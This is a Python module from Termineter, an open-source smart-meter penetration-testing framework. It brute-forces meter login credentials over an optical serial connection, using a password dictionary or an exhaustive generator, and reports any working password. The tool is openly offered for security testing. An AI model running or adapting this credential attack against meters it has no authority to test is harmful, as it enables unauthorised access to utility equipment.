#  termineter/modules/brute_force_login.py
#
#  Copyright 2011 Spencer J. McIntyre <SMcIntyre [at] SecureState [dot] net>
#
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 2 of the License, or
#  (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#  MA 02110-1301, USA.

from __future__ import unicode_literals

import binascii
import os
import re
import time

from termineter.module import TermineterModuleOptical
from termineter.utilities import StringGenerator

class BruteForce:
	def __init__(self, dictionary_path=None):
		if dictionary_path is None:
			self.dictionary = None
		else:
			self.dictionary = open(dictionary_path, 'r')

	def __iter__(self):
		if self.dictionary is None:
			for password in StringGenerator(20):
				yield password
		else:
			password = self.dictionary.readline()
			while password:
				yield password
				password = self.dictionary.readline()
			self.dictionary.close()
		raise StopIteration

def from_hex(data):
	return binascii.a2b_hex(data)

def to_hex(data):
	return binascii.b2a_hex(data).decode('utf-8')

class Module(TermineterModuleOptical):
	connection_state = TermineterModuleOptical.connection_states.none
	def __init__(self, *args, **kwargs):
		TermineterModuleOptical.__init__(self, *args, **kwargs)
		self.author = ['Spencer McIntyre']
		self.description = 'Brute Force Credentials'
		self.detailed_description = 'This module is used for brute forcing credentials on the smart meter.  Passwords are not limited to ASCII values and in order to test the entire character space the user will have to provide a dictionary of hex strings and set USE_HEX to true.'
		self.options.add_boolean('USE_HEX', 'values in word list are in hex', default=True)
		self.options.add_rfile('DICTIONARY', 'dictionary of passwords to try', required=False, default='$DATA_PATH smeter_passwords.txt')
		self.options.add_string('USERNAME', 'user name to attempt to log in as', default='0000')
		self.options.add_integer('USER_ID', 'user id to attempt to log in as', default=1)

		self.advanced_options.add_boolean('PURE_BRUTEFORCE', 'perform a pure bruteforce', default=False)
		self.advanced_options.add_boolean('STOP_ON_SUCCESS', 'stop after the first successful login', default=True)
		self.advanced_options.add_float('DELAY', 'time in seconds to wait between attempts', default=0.20)

	def run(self):
		conn = self.frmwk.serial_connection
		logger = self.logger
		use_hex = self.options['USE_HEX']
		dictionary_path = self.options['DICTIONARY']
		username = self.options['USERNAME']
		user_id = self.options['USER_ID']
		time_delay = self.advanced_options['DELAY']

		if len(username) > 10:
			self.frmwk.print_error('Username cannot be longer than 10 characters')
			return
		if not (0 <= user_id <= 0xffff):
			self.frmwk.print_error('User id must be between 0 and 0xffff')
			return

		if self.advanced_options['PURE_BRUTEFORCE']:
			self.frmwk.print_status('A pure brute force will take a very very long time')
			use_hex = True  # if doing a prue brute force, it has to be True
			pw_generator = BruteForce()
		else:
			if not os.path.isfile(dictionary_path):
				self.frmwk.print_error('Can not find dictionary path')
				return
			pw_generator = BruteForce(dictionary_path)

		hex_regex = re.compile('^([0-9a-fA-F]{2})+$')

		self.frmwk.print_status('Starting brute force')

		for password in pw_generator:
			if not self.advanced_options['PURE_BRUTEFORCE']:
				if use_hex:
					password = password.strip()
					if hex_regex.match(password) is None:
						logger.error('invalid characters found while searching for hex')
						self.frmwk.print_error('Invalid characters found while searching for hex')
						return
					password = from_hex(password)
				else:
					password = password.rstrip()
			if len(password) > 20:
				if use_hex:
					logger.warning('skipping password: ' + to_hex(password) + ' due to length (can not be exceed 20 bytes)')
				else:
					logger.warning('skipping password: ' + password + ' due to length (can not be exceed 20 bytes)')
				continue
			while not conn.start():
				time.sleep(time_delay)
			time.sleep(time_delay)
			if conn.login(username, user_id, password):
				if use_hex:
					self.frmwk.print_good('Successfully logged in. Username: ' + username + ' User ID: ' + str(user_id) + ' Password: ' + to_hex(password))
				else:
					self.frmwk.print_good('Successfully logged in. Username: ' + username + ' User ID: ' + str(user_id) + ' Password: ' + password)
				if self.advanced_options['STOP_ON_SUCCESS']:
					conn.stop(force=True)
					break
			else:
				if use_hex:
					logger.warning('Failed logged in. Username: ' + username + ' User ID: ' + str(user_id) + ' Password: ' + to_hex(password))
				else:
					logger.warning('Failed logged in. Username: ' + username + ' User ID: ' + str(user_id) + ' Password: ' + password)
			while not conn.stop(force=True):
				time.sleep(time_delay)
			time.sleep(time_delay)
		return
